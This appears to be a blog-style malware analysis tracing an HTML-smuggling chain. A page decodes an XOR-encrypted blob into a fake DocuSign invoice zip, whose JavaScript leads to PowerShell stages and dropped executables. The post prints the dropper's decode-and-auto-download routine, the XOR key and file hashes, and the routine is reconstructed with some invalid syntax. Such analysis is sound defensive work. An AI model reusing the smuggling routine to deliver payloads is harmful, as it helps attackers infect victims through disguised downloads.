---
title: Malware Analysis
published: true
---

# STAGE 1:
	`064ee9cc4256a4e004d3c6e74e1a4cc2d686f82a7e22640aa718167b5af40a29  ./sample.html `

this is a HTML file containing the javascript code that drops a zip file,
we can see in the body section it's the payload that is encrypted, the id is `jzasjnpc` & class is `bwkytcnl`.
this is the excrypted zip file, first it's getting converted from base64 & then xor & then base64 decoded again.
the xor key for this zip payload is `so83fnguk42vuluw82syq55zhqqf3qm9sznw3skkxdfbcj2fjy1zbi6t4wn89m8kafg1kvi04dppc1q5xye8zzxo4k6utjrwwsc2f59khfmzkvycg8qxwl36asncitbj`,

```html
<body>
	<main class="bwkytcnl" id="jzasjnpc" data="JipLdyQsNjEqdXM/NCo/QEleEiA9UUYjQzcGJ3IhB3AyOy8ScjIqKiwzIFcuPnMSJxNwAy8QBz5WGTROWDp2By0zNUcyRT9kVTMUBS9cAU8uM....
```
name of the zip file is `May10-2023-Invoice-DocuSign.zip`

this is the procedure that generates the zip file, and in the end that object is executed
```javascript
	function extract_zip(input_url_var, 512)
	{

		var array_new = [];
		var fromb64input_data = atob_fromB64(input_url_var);
		for(var i = 0; i < fromb64input_data.length; i += 512)
		{
			var sliced = fromb64input_data.slice(i, i + 512);
			var sliced_array = new this[array](sliced.length);
			for(var i = 0; i < sliced.length; i++)
			{
				sliced_array[i] = sliced.charCodeAt(i);
			}
			var out_zip = new this[Uint8Array](sliced_array);
			array_new.push(out_zip);
		}
		var zip_data = new this[blob](array_new, {type: octet/stream});
		return zip_data;
	}
	
	function zip_create(zip_data)
	{
		let zip_name = "May10-2023-Invoice-DocuSign" + ".zip";
		let file_obj = new this[file]([zip_data], zip_name, {type: application/zip});
		let file_obj_url = this[URL][createObjectURL](file_obj);
		var createElement_a = document.createElement("a");
		document.body.appendChild(createElement_a);
		createElement_a.setAttribute(href,file_obj_url);
        		createElement_a[download] = zip_name;
                createElement_a.click();
		this[URL][revokeObjectURL](file_obj_url);
	}
```

# STAGE 2:
	`a36c8ea0188ddc3ed8f06c8e352bb314bc222fef6f9baeb211cd97ac62462dec  May10-2023-Invoice-DocuSign.zip`

this zip file contains a javascript file.
	`44737c01c93b96afcbb96c0b38993594d29a0a07d625999ef503c8424da90b0e  ./May10-2023-Invoice-DocuSign.js`

this javascript file contains 4 strings, after concatinating them and after removing "s" & "V" chars & then converting from hex,
gets us another javascript. this is the procedure of that
```javascript
	temp = STR_4.replace(/[sV]/g,'');
	var ooqajrjz = "";
	for (var i=0;i<temp.length;i+=2)
	{
		ttjqepbj = temp.substr(i,2);
		ooqajrjz += str_from_char_code(kmbvxuoa(ttjqepbj, 16));
	}
```

# STAGE 3:
	this javascript produces a powershell script that is run after 10 seconds of sleep, poweshell script is split by "!" and converted from base64


# STAGE 4:
	this powershell script runs a string that is base64 encoded & raw deflated.

# STAGE 5:
	


a0bf6f09f394949c603b878ab42b001155d347e5812b59f09a2ab9d387d548f6  ./a0bf6f09f394949c603b878ab42b001155d347e5812b59f09a2ab9d387d548f6.docx
f2354328324b94918311ef7a13e9c207b75f848bcaadebe7f4753f3d5fcfc63d  ./Base64FormattingOpti.exe.bin
c720d8d87e5744ef459c160ae3ae85984519c5cee89d4acd3d4156f929ebcca2  ./Cerbera.dll
bdddec1e08a612296a6caa2cb79749150e4b6797f6cca9b7f255ae11cfc4398f  ./IVectorView.dll
EA6D52270F7D5AEC22FD17F1904F2DFFD566016A4362D9D5EA81C1D11337DE9E  ./happy.exe 